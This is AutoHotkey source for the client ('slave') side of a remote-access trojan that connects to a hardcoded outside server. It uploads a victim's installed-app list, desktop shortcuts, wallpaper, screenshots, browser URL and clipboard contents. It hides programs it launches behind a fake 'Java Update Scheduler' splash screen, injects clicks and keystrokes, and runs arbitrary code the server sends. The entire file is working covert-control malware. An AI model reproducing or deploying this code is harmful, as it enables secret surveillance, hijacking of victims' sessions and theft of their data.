;======= Slave executable of the program =======

#Include winapi.ini
#Include wininet.ini
#Include win.ini

#NoEnv
#SingleInstance ignore
;#NoTrayIcon
SetBatchLines, -1
SetControlDelay -1
DetectHiddenWindows, On
CoordMode, Mouse, Screen
SetTitleMatchMode, 2
FileEncoding, UTF-8
;FileCreateDir, %A_AppData%\Temporary\
;SetWorkingDir, %A_AppData%\Temporary\
SetWorkingDir, %A_ScriptDir%
ServerLink = http://otsoserver.otso.space:447/ ;SERVER ADDRESS

log("Launched Slave.")
sleep 3000

;get server status (check server availability):
checkserverstatus:

responsik := GetServer("/", ServerLink)
if (responsik == "terror")
{
	sleep 7777
	log("Can't access the server.")
	goto, checkserverstatus
}
else
{
	log("Connected to the server.")
}

;getting hwid

pleasetry:
HWIDAKA := getHWID()
log("My HWID is " HWIDAKA)

;get installed apps list:
headers := [ "DISPLAYNAME", "VERSION", "PUBLISHER", "PRODUCTID", "REGISTEREDOWNER", "REGISTEREDCOMPANY", "LANGUAGE", "SUPPORTURL", "SUPPORTTELEPHONE", "HELPLINK", "INSTALLLOCATION", "INSTALLSOURCE", "INSTALLDATE", "CONTACT", "COMMENTS", "IMAGE", "UPDATEINFOURL" ]
data := []           
for k, v in headers
   data.Push( GetAppsInfo({ mask: v, offset: A_PtrSize*(k - 1) }) )

arr := []
for k, v in data
   for i, j in v
      arr[i, k] := j
   
for k, v in arr  {
   appisdata .= (k = 1 ? "" : "`r`n")
   for i, j in v
      appisdata .= (i = 1 ? "" : ", ") . j
}

;get lists of shortcuts both on user's own desktop and on public desktop
yarliksdata = SHORTCUTS:
Loop, Files, %A_Desktop%\*.lnk
{
	try
	{
	Ebalo := ComObjGet("winmgmts:").ExecQuery("Select * from Win32_ShortcutFile where Name='" . StrReplace(A_LoopFileLongPath, "\", "\\") . "'").ItemIndex(0).Target
	yarliksdata = %yarliksdata%`n%Ebalo%
	}
	catch
	{
	}
}
Loop, Files, %A_DesktopCommon%\*.lnk
{
	try
	{
	Ebalo := ComObjGet("winmgmts:").ExecQuery("Select * from Win32_ShortcutFile where Name='" . StrReplace(A_LoopFileLongPath, "\", "\\") . "'").ItemIndex(0).Target
	yarliksdata = %yarliksdata%`n%Ebalo%
	}
	catch
	{
	}
}

;get wallpaper
Loop Files, %A_AppData%\Microsoft\Windows\Themes\CachedFiles\*.jpg
	wallpaperfile := A_LoopFileFullPath

;registering computer on server and putting info about it
FileAppend, %appisdata%, appsdata.log
PutServer("appsdata.log", HWIDAKA "/appsdata.txt", ServerLink) ;tell server about installed apps
FileDelete, appsdata.log
FileAppend, %yarliksdata%, yarliksdata.log
PutServer("yarliksdata.log", HWIDAKA "/yarliksdata.txt", ServerLink) ;tell server about shortcuts on desktop
FileDelete, yarliksdata.log
PutServer(wallpaperfile, HWIDAKA "/wallpaper.jpg", ServerLink) ;send server current wallpaper

;checking for commands and sending alive status
Zaloop:
Loop
{
	;sending "alive" status to server:
	FileAppend, %A_Now%, last_active.log
	DelServer(HWIDAKA "/last_active.log", ServerLink)
	PutServer("last_active.log", HWIDAKA "/last_active.log", ServerLink)
	FileDelete, last_active.log
	
	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting current command
	
	if InStr(currentcommand,"allwinshot") ;if command to make screenshot of all screen
	{
	DelServer(HWIDAKA "/current.command", ServerLink)
	FileDelete, screen.jpg
	DelServer(HWIDAKA "/screen.jpg", ServerLink)
	CaptureScreen(0, 1, "screen.jpg", 40)
	PutServer("screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
	FileDelete, screen.jpg
	goto, Zaloop
	}
	
	If InStr(currentcommand,"execute,")
		goto, executing
	Else
		sleep 10000

}


executing: ;finally executing opening a hidden window
StringSplit, command_array, currentcommand, `,
windowweneed = %command_array7% ; win title we are waiting for
offset := 120
smallerW := A_ScreenWidth - offset
smallerH := A_ScreenHeight - offset

;move mouse away from taskbar:
MouseGetPos, xxx, yyy,,,3 
if ((xxx > smallerW) || (yyy > smallerH))
	MouseMove, -%offset%, -%offset%, 0, R
if ((xxx < offset) || (yyy < offset))
	MouseMove, %offset%, %offset%, 0, R
	
;------ fake screenshot:
;Blockinput, On ;do we need this? who knows...
CaptureScreen(0, 0, "XWD.PNG")
SplashImage, XWD.PNG, w%A_ScreenWidth% h%A_ScreenHeight% x0 y0 B,,, Java Update Scheduler
WinMove, Java Update Scheduler,, X0, Y0, %A_ScreenWidth%, %A_ScreenHeight%
WinSet, AlwaysOnTop, On, Java Update Scheduler,

Run, %command_array2%%A_Space%%command_array3%

sleep 100
waitingforworms: ;waiting for the window to be open
sleep 100
if !WinExist(windowweneed)
	goto, waitingforworms

WinGet, hwnd,ID,%windowweneed% ;getting hwnd of window and START HWND LIFE!!!!

;hide the launched window:
WinRestore, ahk_id %hwnd%
WinMove, ahk_id %hwnd%,, %smallerW%, %smallerH%, %command_array5%, %command_array6% ;move window almost out of screen and set size we need
WinSet, Transparent, 1, ahk_id %hwnd% ;make window transparent
WinSet, ExStyle, +0x80, ahk_id %hwnd% ;remove window icon in taskbar by setting its style
WinSet, AlwaysOnTop, On, ahk_id %hwnd%

Blockinput, Off
sleep 199
WinSet, Top,, ahk_class Shell_TrayWnd ;make taskbar appear in front of our window again
SplashImage, Off
FileDelete, XWD.PNG

Loop ;checking server for active commands and executing them
{
	Loop 6 ; check mouse legality
	{
		sleep 70
		;WinClose, ahk_class Chrome_WidgetWin_1, , , Google Chrome ;close "odd" "window"
		MouseGetPos, xx, yy,,,3
		if ((xx >= smallerW) && (yy >= smallerH))
			winhide, ahk_id %hwnd%
		else
			winshow, ahk_id %hwnd%
	}
	log("Finished checking mouse legality.")
	
	;taking and sending the window screenshot to the server
	WinGetPos,,, OutWidth, OutHeight, ahk_id %hwnd%
	pToken:=Gdip_Startup()
	pBitmap:=Gdip_BitmapFromHWND(hwnd)
	pBitmap_part:=Gdip_CloneBitmapArea(pBitmap, 0, 0, OutWidth, OutHeight)
	Gdip_SaveBitmapToFile(pBitmap_part, "shota.jpg")
	Gdip_DisposeImage(pBitmap)
	Gdip_DisposeImage(pBitmap_part)
	Gdip_Shutdown(pToken)
	log("Captured window.")
	sleep 9
	PutServer("shota.jpg", HWIDAKA "/shota.jpg", ServerLink)
	FileDelete, shota.jpg
	log("Sent window image.")

	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting command from server
	log("Received command: " currentcommand)
	
	;checking for commands and acting accordingly:
	if InStr(currentcommand, "nothing") ;if commanded to exit, close window and go back to monitoring
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		WinMove, ahk_id %hwnd%,, 100, 100
		WinRestore, ahk_id %hwnd%
		WinClose, ahk_id %hwnd%
		sleep 1700
		log("Commanded to stop window. Did so.")
		goto, Zaloop
	}
	if InStr(currentcommand,"allwinshot") ;command to make screenshot of all screen
	{
	DelServer(HWIDAKA "/current.command", ServerLink)
	FileDelete, screen.jpg
	DelServer(HWIDAKA "/screen.jpg", ServerLink)
	CaptureScreen(0, 1, "screen.jpg", 40)
	PutServer("screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
	FileDelete, screen.jpg
	log("Captured and sent all screen shot.")
	}
	if InStr(currentcommand, "clickandtext") ;clickandtext,X88 Y88,helloworld
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		StringSplit, splitted, currentcommand, `,
		ControlClick, %splitted2%, ahk_id %hwnd%,, LEFT,,
		sleep 95
		ControlSend,, %splitted3%, ahk_id %hwnd%
		log("Sent input and (or) click.")
	}
	if InStr(currentcommand, "copylink") ;copylink,please
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		WinGetClass, strClass, ahk_id %hwnd%
		CurrentUri := GetCurrentUrlAcc(strClass)
		FileAppend, Current URL: %CurrentUri%`nCurrent clipboard: %Clipboard%, clip.txt
		PutServer("clip.txt", HWIDAKA "/clip.txt", ServerLink)
		FileDelete, clip.txt
		log("Current Window URL sent to Master.")
	}
	if InStr(currentcommand, "executethecodeplease,") ;executethecodeplease,
	{
		DelServer(HWIDAKA "/current.command", ServerLink)
		FileDelete, TMP.ahk
		FileAppend, %currentcommand%, TMP.ahk
		
		If FileExist("C:\Program Files\AutoHotkey\AutoHotkeyU32.exe")
			AHKPATH = C:\Program Files\AutoHotkey\AutoHotkeyU32.exe
		Else
			AHKPATH = %A_ScriptDir%\AutoHotkey.exe
		
		try
		{
		Run, "%AHKPATH%" "%A_WorkingDir%\TMP.ahk"
		}
		catch
		{
		log("Unable to execute Ahk code.")
		}
	}
}

